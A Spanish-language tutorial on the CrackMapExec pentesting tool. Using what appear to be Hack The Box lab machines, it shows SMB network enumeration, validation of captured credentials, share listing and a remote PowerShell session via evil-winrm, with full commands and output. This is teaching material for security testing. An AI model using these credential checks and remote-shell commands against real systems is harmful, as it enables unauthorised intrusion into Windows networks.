CrackMapExec (frecuentemente abreviado como CME) es una herramienta de código abierto muy popular desarrollada en Python, concebida principalmente para auditorías de seguridad, pruebas de penetración (pentesting) y ejercicios de Red Teaming en redes corporativas con entornos Windows y Active Directory.

Se le conoce popularmente como la "navaja suiza" de la post-explotación debido a su versatilidad para automatizar tareas a gran escala en múltiples equipos de una red local. CrackMapExec es una herramienta de seguridad de red que se utiliza para escanear redes, identificar hosts y realizar ataques de credenciales.
### Listar equipos disponibles de Windows con Crakmapexec
```bash
(root@kali)-[/home/mario/Escritorio]
# crackmapexec smb 192.168.0.0/24
SMB     192.168.0.5     445     LES010048       [*] Windows 10.0 Build 22000 x64 (name:LES010048) (domain:mariodominio.local) (signing:True) (SMBv1:False)
SMB     192.168.0.8     445     DC-COMPANY      [*] Windows 10.0 Build 17763 x64 (name:DC-COMPANY) (domain:mariodominio.local) (signing:True) (SMBv1:False)
SMB     192.168.0.11    445     WIN-M9BJX56WLVW [*] b'W\x00i\x00n\x00d\x00o\x00w\x00s\x00\x00e\x00r\x00v\x00e\x00r\x00 \x002\x000\x000\x003\x00 \x003\x000\x003\x009\x00 \x003\x005\x009\x00x\x00005\x00e\x00r\x00v\x00i\x00c\x00e\x00 \x00P\x00a\x00c\x00k\x00 \x002\x000\x002\x00k\x00 \x002\x000\x002\x00C\x00o\x00m\x00p\x00a\x00n\x00y\x00' (name:WIN-M9BJX56WLVW) (domain:WIN-M9BJX56WLVW.QN6C.LOCAL) (signing:False) (SMBv1:True)
```

### Detectar dominio y hostname con crackmapexec
Vemos que tiene abierto el puerto 445, que es el puerto smb, por tanto vamos a lanzar un comando de para ver dominios (sirve para hacer pentesting a Windows):
```bash
(mario@kali)-[~]
$ crackmapexec smb 10.10.10.100
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SSH protocol database
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB     10.10.10.100    445     DC              [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
```
### Comprobar y validar credenciales con crackmapexec
En caso de obtener unas credenciales en texto claro, con crackmapexec podemos comprobar si estas credenciales son correctas; y vemos que sí:
```bash
crackmapexec smb 10.10.10.100 -u 'user' p 'pass'
```
```bash
(root@kali)-[/home/mario/Escritorio/active]
# crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB     10.10.10.100    445     DC              [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB     10.10.10.100    445     DC              [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

### Listar recursos compartidos con crackmapexec
Entonces con estas credenciales válidas podemos listar recursos compartidos con crackmapexec; y podemos listar archivos dentro de varias ubicaciones, entre las que tenemos la de users:
```bash
(root@kali)-[/home/mario/Escritorio/active]
# crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
SMB     10.10.10.100    445     DC              [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB     10.10.10.100    445     DC              [+] active.htb\SVC_TGS:GPPstillStandingS
trong2k18
SMB     10.10.10.100    445     DC              [+] Enumerated shares
SMB     10.10.10.100    445     DC              Share       Permissions     Remark
SMB     10.10.10.100    445     DC              -----       -----------     ------
SMB     10.10.10.100    445     DC              ADMIN$                      Remote A
dmin
SMB     10.10.10.100    445     DC              C$                          Default 
share
SMB     10.10.10.100    445     DC              IPC$                        Remote I
PC
SMB     10.10.10.100    445     DC              NETLOGON    READ            Logon se
rver share
SMB     10.10.10.100    445     DC              Replication READ
SMB     10.10.10.100    445     DC              SYSVOL      READ            Logon se
rver share
SMB     10.10.10.100    445     DC              Users       READ
```

### VALIDAR SI PODEMOS EJECUTAR EVIL-WINRM
Vamos a conectarnos a través de winrm (administración remota de windows), ya que con crackmapexec vemos que también podemos entrar:
```bash
(kali@kali)-[~/Downloads]
$ crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB     10.10.11.108    5985    PRINTER         [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:ret
urn.local)
HTTP    10.10.11.108    5985    PRINTER         [*] http://10.10.11.108:5985/wsman
WINRM   10.10.11.108    5985    PRINTER         [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```
Pues ahora vamos a explotar la conexión winrm con una herramienta que se llama evil-winrm, donde la instalaré de esta manera:
```bash
(kali@kali)-[~/Downloads]
$ sudo gem install evil-winrm
[sudo] password for kali:
Fetching evil-winrm-3.4.gem
Happy hacking! :)
Successfully installed evil-winrm-3.4
Parsing documentation for evil-winrm-3.4
Installing ri documentation for evil-winrm-3.4
Done installing documentation for evil-winrm after 1 seconds
1 gem installed
```
Y ahora ejecutamos este comando para conectarnos por winrm:
```bash
(kali@kali)-[~/Downloads]
$ evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012 !! '
```
```bash
(kali@kali)-[~/Downloads]
$ evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012 !! '
Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```